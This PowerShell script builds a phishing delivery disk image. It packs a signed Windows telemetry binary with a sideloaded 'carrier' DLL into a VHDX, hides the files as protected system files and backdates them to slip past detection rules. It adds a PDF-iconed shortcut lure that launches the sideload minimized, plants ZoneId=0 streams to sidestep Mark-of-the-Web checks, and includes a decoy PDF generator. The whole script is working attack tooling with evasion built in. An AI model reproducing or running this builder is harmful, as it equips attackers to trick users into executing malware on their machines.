<#
.SYNOPSIS

.DESCRIPTION

.PARAMETER VhdPath

.PARAMETER LocalForm

.PARAMETER DriveLetter

.PARAMETER AgeDays
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$VhdPath,
    [string]$OutDir      = ".\out",
    [string]$DllPath     = "..\bin\appraiser.dll",
    [string]$HostExe     = "",
    [string]$DecoyPdf    = "",
    [string]$LnkBaseName = "test",
    [ValidateSet('File', 'Folder')] [string]$LocalForm = 'File',
    [string]$DriveLetter = 'E',
    [int]   $SizeMB      = 32,
    [int]   $AgeDays     = 120
)

$ErrorActionPreference = 'Stop'

function Resolve-FromScript([string]$p) {
    if ([IO.Path]::IsPathRooted($p)) { return $p }
    return [IO.Path]::GetFullPath((Join-Path $PSScriptRoot $p))
}

function New-MinimalPdf([string]$Path, [string]$Title) {
    $objs = @(
        '<</Type/Catalog/Pages 2 0 R>>',
        '<</Type/Pages/Kids[3 0 R]/Count 1>>',
        '<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>',
        $null,
        '<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>'
    )
    $stream = "BT /F1 18 Tf 72 720 Td ($Title) Tj ET"
    $objs[3] = "<< /Length $($stream.Length) >>stream`n$stream`nendstream"

    $pdf = "%PDF-1.4`n"
    $offsets = @()
    for ($i = 0; $i -lt $objs.Count; $i++) {
        $offsets += $pdf.Length
        # The generation number is mandatory: pdf.js fails hard on "N obj".
        $pdf += "$($i + 1) 0 obj$($objs[$i])endobj`n"
    }
    $xref = $pdf.Length
    $pdf += "xref`n0 $($objs.Count + 1)`n0000000000 65535 f `n"
    foreach ($o in $offsets) { $pdf += ("{0:d10} 00000 n " -f $o) + "`n" }
    $pdf += "trailer<</Size $($objs.Count + 1)/Root 1 0 R>>`nstartxref`n$xref`n%%EOF`n"

    [IO.File]::WriteAllText($Path, $pdf, [Text.Encoding]::ASCII)
}

$OutDir   = Resolve-FromScript $OutDir
$DllPath  = Resolve-FromScript $DllPath
$VhdPath  = Resolve-FromScript $VhdPath
if (-not (Test-Path $DllPath)) { throw "carrier not found: $DllPath" }

if (-not $HostExe) {
    $HostExe = Join-Path $env:SystemRoot 'System32\compattelrunner.exe'
}
if (-not (Test-Path $HostExe)) { throw "host not found: $HostExe" }
Write-Host "host   : $HostExe"
Write-Host "carrier: $DllPath"
Write-Host "form   : $LocalForm"

# ---- staging -------------------------------------------------------
$stage = Join-Path $OutDir ("stage-" + [Guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Force -Path $stage | Out-Null

Copy-Item $HostExe (Join-Path $stage 'compattelrunner.exe')

if ($LocalForm -eq 'Folder') {
    $localDir = Join-Path $stage 'compattelrunner.exe.local'
    New-Item -ItemType Directory -Force -Path $localDir | Out-Null
    Copy-Item $DllPath (Join-Path $localDir 'appraiser.dll')
} else {
    Copy-Item $DllPath (Join-Path $stage 'appraiser.dll')
    # Presence alone redirects; contents are ignored.
    Set-Content -Path (Join-Path $stage 'compattelrunner.exe.local') -Value '' -NoNewline
}

$decoy = Join-Path $stage "$LnkBaseName.pdf"
if ($DecoyPdf -and (Test-Path (Resolve-FromScript $DecoyPdf))) {
    Copy-Item (Resolve-FromScript $DecoyPdf) $decoy
} else {
    New-MinimalPdf $decoy 'Appendix A - supporting notes'
}

# ---- VHDX ---------------------------------------------------------
$abs = Resolve-FromScript $VhdPath
$dp  = Join-Path $OutDir 'diskpart.txt'
@"
select vdisk file="$abs"
detach vdisk
"@ | Set-Content $dp
@(& diskpart /s $dp 2>&1) | Out-Null
if (Test-Path $abs) { Remove-Item $abs -Force }

@"
create vdisk file="$abs" maximum=$SizeMB type=expandable
select vdisk file="$abs"
attach vdisk
convert mbr
create partition primary
select partition 1
active
format fs=ntfs label="Documents" quick
assign letter=$DriveLetter
"@ | Set-Content $dp

Write-Host "creating $([IO.Path]::GetExtension($abs)): $abs"
$dpOut = @(& diskpart /s $dp 2>&1)
if ($dpOut -match '(?i)failed|error|not able|invalid') {
    throw "diskpart reported a failure: $($dpOut -join ' | ')"
}

try {

$letter = $null
# Bind to the image this script just created, never to "the newest
# file-backed disk": a second mounted image is just as new.
$img = Get-DiskImage -ImagePath $abs -ErrorAction Stop
if (-not $img.Attached) { throw "image is not attached after diskpart: $abs" }
Get-Disk -Number $img.Number | Get-Partition | ForEach-Object {
    if ($_.DriveLetter) { $letter = $_.DriveLetter }
}
if (-not $letter) { throw "no drive letter assigned for $abs" }
$root = "${letter}:\"
Write-Host "root   : $root"

foreach ($f in (Get-ChildItem $stage -Force)) {
    Copy-Item $f.FullName $root
    Write-Host ("  [copy] {0} -> {1} ({2} bytes)" -f $f.Name, $root, $f.Length)
}

# ---- attributes: everything hidden but the lure ---------------------
# Hidden+System marks the file as a protected OS file, which Explorer hides
# under its own option -- "show hidden files" does not reveal it.
$hidden = @('compattelrunner.exe', "$LnkBaseName.pdf")
if ($LocalForm -eq 'Folder') {
    $hidden += 'compattelrunner.exe.local', 'compattelrunner.exe.local\appraiser.dll'
} else {
    $hidden += 'appraiser.dll', 'compattelrunner.exe.local'
}
foreach ($f in $hidden) {
    [IO.File]::SetAttributes((Join-Path $root $f),
        [IO.FileAttributes]::Hidden -bor
        [IO.FileAttributes]::System -bor
        [IO.FileAttributes]::Archive)
    Write-Host "  [attr] Hidden+System on $f"
}

# ---- age the files -------------------------------------------------
# Sideload rules fire on files touched inside a short recency window;
# the volume is packaged ahead of delivery, so the ages carry across.
$old = (Get-Date).AddDays(-$AgeDays)
foreach ($f in $hidden) {
    $p = Join-Path $root $f
    [IO.File]::SetLastWriteTime($p, $old)
    [IO.File]::SetCreationTime($p, $old)
    Write-Host ("  [time] {0} set to {1:yyyy-MM-dd}" -f $f, $old)
}

# ---- the lure ------------------------------------------------------
# The arguments pin the plugin and its entry function -- both are validated
# against the host's whitelists at run time. Console host, hence minimized.
$lnkPath = Join-Path $root "$LnkBaseName.pdf.lnk"
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut($lnkPath)
$lnk.TargetPath       = "${DriveLetter}:\compattelrunner.exe"
$lnk.Arguments        = '-m:appraiser.dll -f:DoScheduledTelemetryRun'
$lnk.WorkingDirectory = "${DriveLetter}:\"
$lnk.IconLocation     = "$LnkBaseName.pdf,0"
$lnk.Description      = 'Appendix A - supporting notes'
$lnk.WindowStyle = 7
$lnk.Save()

# ZoneId=0 is Local Machine, so the MotW check stops at this volume.
# -NoNewline keeps the stream in its canonical form.
$zone = "[ZoneTransfer]`r`nZoneId=0"
foreach ($f in ($hidden + @("$LnkBaseName.pdf.lnk"))) {
    Set-Content -Path (Join-Path $root $f) -Stream 'Zone.Identifier' `
        -Value $zone -NoNewline
}
Write-Host "  [zone] ZoneId=0 baked into every file in the volume"
Write-Host "  [lnk ] $LnkBaseName.pdf.lnk -> ${DriveLetter}:\compattelrunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun"

# ---- release -------------------------------------------------------
} finally {
    # Detached unconditionally: a throw above must not leave the artefacts
    # on a live volume.
    Set-Content -Path $dp -Value @(
        "select vdisk file=`"$abs`"",
        "detach vdisk"
    )
    @(& diskpart /s $dp 2>&1) | Out-Null
}

Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "done: $abs"

# The image carries no Mark of its own; a channel that adds one still needs
# a clean channel or an Unblock-File on the target.
Unblock-File $abs -ErrorAction SilentlyContinue
Write-Host "image unblocked: $((Get-Item $abs -Stream Zone.Identifier -ErrorAction SilentlyContinue) -eq $null)"

Write-Host "only visible item in the volume:"
Write-Host "  $LnkBaseName.pdf.lnk"
